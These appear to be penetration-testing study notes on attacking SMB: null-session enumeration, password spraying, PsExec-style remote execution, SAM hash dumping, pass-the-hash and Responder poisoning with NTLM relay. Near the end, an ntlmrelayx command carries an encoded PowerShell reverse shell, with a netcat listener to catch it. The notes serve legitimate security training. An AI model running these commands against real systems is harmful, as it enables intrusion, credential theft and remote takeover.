Initially, SMB was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port `139` and UDP ports `137` and `138`. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port `445` without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.

Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.

[MSRPC (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft_RPC) is commonly related to SMB. RPC allows developers a generic way to execute a procedure in a local or remote process, without having to understand the protocols used for the communications. [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15) defines an RPC over SMB that can use SMB protocol named pipes as its underlying transport.

### Misconfigurations

SMB can be configured to not require authentication, which can be called `null session`.

#### Anonymous Authentication

If an SMB server doesn't require credentials, or we obtained the credentials, we can get a list of shares, usernames, groups permissions, policies, services, etc.

#### File Share

With `smbclient` we can list server's shares with `-L`, `-N` is for null session.

```shell-session
$ smbclient -N -L //10.129.14.128
```

`Smbmap` also provides a list of permissions for each shared folder.

```shell-session
$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes
```

With the `-r` or `-R` option we can browse the directories:
```shell-session
$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

We can download or upload files with read or write permissions:
```shell-session
$ smbmap -H 10.129.14.128 --download "notes\note.txt"
```
```shell-session
$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

#### Remote Procedure Call (RPC)

We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller.

`rpcclient` offers many commands to execute functions on the SMB server to access or modify attributes like username. We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.

```shell-session
$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:

- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

The [original tool](https://github.com/CiscoCXSecurity/enum4linux) was written in Perl and [rewritten by Mark Lowe in Python](https://github.com/cddmp/enum4linux-ng).

```shell-session
$ ./enum4linux-ng.py 10.10.11.45 -A -C
```

### Protocol Specific Attacks

#### Brute Forcing and Password Spray

Is better to not use brute force if we don't know the threshold and can stop before we reach it.

Password spraying is better alternative, usually 2 or 3 tries are safe, provided we wate 30-60 minutes between attempts. [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) includes the ability to execute password spraying.

```shell-session
$ crackmapexec smb <ip address> -u <user file path> -p '<password>' --local-auth
```

**Note:** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`. For a more detailed study Password Spraying see the Active Directory Enumeration & Attacks module.

#### SMB

Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, in Windows environments we will be limited by the privileges of the user we were able to compromise.

#### Remote Code Execution (RCE)

The Windows Sysinternals is a website created in 1996 to offer technical resources and utilities to manage, diagnose, troubleshoot, and monitor Microsoft Windows environment. Microsoft aquired Sysinternals and its assets in 2006.

One of the Sysinternals featured freeware tools in the [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/) is PsExec.

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) lets us execute processes on other systems, with full interactivity with console applications, and without having to install client software manually. It works because it has Windows service image inside of its executables. It takes this service and deploys it to the admin$ share (by default) in the remote machine. it can use DCE/RPC interface over SMB to access the Windows service Control Manager API. Next it starts the PSExec service on the remote machine, which then creates an [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.

We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

#### Impacket PsExec

Connect to a remote machine with a local administrator account:
```shell-session
$ impacket-psexec administrator:'<password>'@<ip address>
```

The same options apply to `impacket-smbexec` and `impacket-atexec`.

#### CrackMapExec

One advantage of CrackMapExec is the availability to run a command on multiples host at a time.

```shell-session
$ crackmapexec smb 10.<ip address> -u Administrator -p '<password>' -x 'whoami' --exec-method smbexec
```

**Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

#### Enumerating Logged-on Users
```shell-session
$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

#### Extract Hashes from SAM Database

SAM can be used to authenticate local and remote users, with administrative privileges we can extract its hashes, which can be used for different purposes:

- Authenticate as another user.
- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
- Pass The Hash.

```shell-session
$ crackmapexec smb <ip address> -u administrator -p '<password>' --sam
```

#### Pass-the-Hash (PtH)

We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools.

```shell-session
$ crackmapexec smb <ip address> -u Administrator -H <hash>
```

#### Forced Authentication Attacks

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

[Responder](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configurations, it will find LLMNR and NBT-NS traffic, then it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

Creating a fake SMB server with the default configuration:
```shell-session
$ responder -I <interface name>
```

When a user or a server tries to perform a Name Resolution (NR), on Windows machines the procedure to retrieve a host's IP address by its hostname is as follows:

- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Attackers can listen for queries where the user mistyped a share folder's name and spoof a response, because the integrity isn't verified the victim will trust the malicious servers, this trust is usually used to still credentials.

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.

**Note:** If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.

```shell-session
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If we can't crack the hash we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py).

First we will set SMB to off in our responder configuration file (`/etc/responder/Responder.conf`).

```shell-session
$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

```shell-session
$ impacket-ntlmrelayx --no-http-server -smb2support -t <ip address>
```

We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

```shell-session
$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

```shell-session
$ nc -lvnp 9001
```

#### RPC

With RPC apart from enumeration we can make changes to the system, such as:

- Change a user's password.
- Create a new domain user.
- Create a new shared folder.

Keep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) from the SANS Institute to explore this further.

## Latest SMB Vulnerabilities

One recent vulnerability that effected SMB is [SMBGhost](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796) with the [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796). The vulnerability consisted of a compression mechanism of the version SMB v3.1.1which made Windows 10 versions 1903 and 1909 vulnerable to attack by an unauthenticated attacker. The attack allowed the attacker to gain RCE and full access to the remote target system.

### The Concept of the Attack

In simple terms this is an [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) vulnerability in a function of an SMB driver that allows system commands to be overwritten while accessing memory. An integer overflow is a result of CPU attempting to generate a number that is greater then that required for the allocated memory space. It can occur for example when a programmer does not allow a negative number to occur, and a variable preforms an operation that results in a negative number, and the variable is returned as a positive integer. The vulnerability occurred because at the time, the function lacked bounds checks to handle the size of the data sent in the process of SMB session negotiation.

The vulnerability occurs while processing a malformed compressed message after the `Negotiate Protocol Responses`. If the SMB server allows requests, compression is generally supported, where the server and the client set the terms of communication before the client sends more data. In case the data transmitted exceeds the integer variable limits, those parts are overwritten to the buffer, which leads to the overwriting of the subsequent CPU instructions and interrupts the process's normal or planned execution. These data sets can be structured so that the overwritten instructions will be replaced with our own.

#### Initiation of the Attack
|**Step**|**SMBGhost**|**Concept of Attacks - Category**|
|---|---|---|
|`1.`|The client sends a request manipulated by the attacker to the SMB server.|`Source`|
|`2.`|The sent compressed packets are processed according to the negotiated protocol responses.|`Process`|
|`3.`|This process is performed with the system's privileges or at least with the privileges of an administrator.|`Privileges`|
|`4.`|The local process is used as the destination, which should process these compressed packets.|`Destination`|

#### Trigger Remote Code Execution
|**Step**|**SMBGhost**|**Concept of Attacks - Category**|
|---|---|---|
|`5.`|The sources used in the second cycle are from the previous process.|`Source`|
|`6.`|In this process, the integer overflow occurs by replacing the overwritten buffer with the attacker's instructions and forcing the CPU to execute those instructions.|`Process`|
|`7.`|The same privileges of the SMB server are used.|`Privileges`|
|`8.`|The remote attacker system is used as the destination, in this case, granting access to the local system.|`Destination`|

